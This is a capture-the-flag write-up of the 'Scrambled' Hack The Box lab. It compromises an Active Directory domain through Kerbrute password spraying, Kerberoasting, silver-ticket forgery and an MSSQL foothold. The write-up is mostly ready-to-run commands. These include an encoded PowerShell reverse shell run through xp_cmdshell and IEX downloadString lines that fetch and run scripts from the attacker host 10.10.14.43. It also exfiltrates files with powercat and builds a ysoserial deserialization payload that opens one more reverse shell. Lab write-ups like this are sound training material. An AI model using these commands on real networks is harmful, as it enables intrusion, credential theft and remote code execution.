![scrambled.png](scrambled.png)

# Scrambled

## Enum
Web documentation
```bash
phone internal dial - 08
support@scramblecorp.com
ipconfig > %USERPROFILE%\Desktop\ip.txt
4411 - Sale order client custom app
NTLM has been disabled
```

Domain names
```bash
scramblecorp.com
scrm.local
dc1.scrm.local
hostmaster.scrm.local
```

## Kerberos bruteforcing 
Using Kerbrute for user enumeration
```bash
kerbrute userenum \
    -d scrm.local \
    --dc scrambled.htb \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Using Kerbrute for password spraying
```bash
kerbrute passwordspray \
    -d scrm.local \
    --dc scrambled.htb \
    ./users.txt \
    ksimpson
```

## Obtaining a TGT
Granting ourselves a Kerberos TGT based on discovered password
```bash
getTGT.py \
    scrm.local/ksimpson:ksimpson \
    -dc-ip scrambled.htb
```

Enumerating smb shares with the TGT
```bash
smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip scrambled.htb -debug -k 
```

## Kerberoasting

Obtaining a TGS with GetUserSPNs.py 

An SPN is the id of a service instance  
SPNs are used by Kerberos to associate a service instance with a service logon account  
This allows a client to request that the service authenticate an account  
even if the client does not have the account name  
So basically which GetUserSPNs does is:  
it gets the SPNs associated with ksimpson  
by requesting TGSes for those, so we get back a TGS  
from which we know the SPN of MSSQLSvc/dcq.scrm.local  
```bash
export KRB5CCNAME=ksimpson.ccache
GetUserSPNs.py \
    -request scrm.local/ksimpson \
    -no-pass \
    -k \
    -dc-host dc1.scrm.local \
    -outputfile kerbrute-key.txt
```

Using john to crack the TGS
```bash
john kerbrute-key.txt --wordlist=/usr/share/wordlists/rockyou.txt
Pegasus60
```

## Silver Ticket Attack
```
- Golden ticket - Access to the whole Domain by stealing the krbtgt NT-Hash allowing to forge a TGT  
- Silver ticket - Access to a single service by stealing the svc NT-Hash allowing to forge a TGS  
```
See BlackHat talk [Abusing Microsof Kerberos: Sorry You Guys Don't Get It](https://youtu.be/lJQn06QLwEw)  
We have all the ingredients to perform a silver ticket attack:  
```
NTHash     - can be derived from sqlsvc's password
Domain SID - The security identifier of the domain
Domain     - scrm.local
SPN        - we got that from GetUserSPN.py
User Id    - uid 500
```

Get the Domain SID from the PAC - (Privileged Attribute Certificate)

The PAC is an extension to Kerberos tickets that contains useful information about a user’s privileges  
This information is added to Kerberos tickets by a DC when a user authenticates to the domain.  
The PAC can be read when users use their Kerberos tickets to authenticate to other systems.  
This can be leveraged to determine their level of privileges without reaching out to the DC.  
```bash
getPac.py \
    -targetUser ksimpson \
    scrm.local/ksimpson:ksimpson

Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

The info that's relevant to us here is the Domain SID,  
so we could get that from any user in the domain,  
as long as we can authenticate with kerberos and get their PAC  
```bash
getPac.py \
    -targetUser \
    sqlsvc scrm.local/sqlsvc:Pegasus60

Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

Make a NT hash from the password we already got from cracking the TGS

[https://codebeautify.org/ntlm-hash-generator](https://codebeautify.org/ntlm-hash-generator)  
or do it like an adult  
```bash
printf "Pegasus60"|xxd
printf "Pegasus60"|iconv -f ASCII -t UTF-16LE|xxd
printf "Pegasus60"|iconv -f ASCII -t UTF-16LE|openssl dgst -md4
printf "Pegasus60"|iconv -f ASCII -t UTF-16LE|openssl dgst -md4|awk '{print $NF}'
b999a16500b87d17ec7f2e2a68778f05
```

Generating a "Silver ticket" to access the MsSQL instance
```bash
ticketer.py \
-nthash b999a16500b87d17ec7f2e2a68778f05 \
-domain-sid S-1-5-21-2743207045-1827831105-2542523200 \
-domain scrm.local \
-spn MSSQLSvc/dc1.scrm.local \
-user-id 500 \
Administrator
```

## MsSQL Foothold 

Use the "Silver Ticket" TGS to connect to MsSQL with impacket
```bash
export KRB5CCNAME=Administrator.ccache
mssqlclient.py -k dc1.scrm.local
```

Loot the Database
```sql
SQL> select name from sys.databases
SQL> select tabe_name from information_schema.tables
SQL> use ScrambleHR
SQL> select * from UserImport
MiscSvc - ScrambledEggs9900 - scrm.local
```

Use `enable_xp_cmdshell` to run a shell through MsSQL
[https://www.revshells.com/](https://www.revshells.com/)  
```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAzACIALAA0ADIANAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

## Lateral privesc

Run Nishang's Invoke-PowerShellTcp.ps1 as scrm\miscsvc
```powershell
$password = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("scrm\miscsvc", $password)

Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 4545 } -Credential $creds
```

## Binary reversing and exploitation

Exfitrate ScrambleClient.exe with powercat
```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.43:8000/powercat.ps1')
powercat -c 10.10.14.43 -p 4646 -i C:\Users\miscsvc\Downloads\ScrambleLib.dll
nc -lp 4646 -q 1  > ScrambleLib.dll < /dev/null
powercat -c 10.10.14.43 -p 4646 -i C:\Users\miscsvc\Downloads\ScrambleClient.exe
nc -lp 4646 -q 1  > ScrambleClient.exe < /dev/null
```
We then need to reverse the binary and dll with dnSpy to figure out that it uses BinaryFormatter.  
Which does some insecure deserialisation and will let us execute one more reverse shell  

Use the .NET adaptation of ysoserial to craft payload  
```powershell
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.43:8000/Invoke-TcpReverseShell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 4747"
```
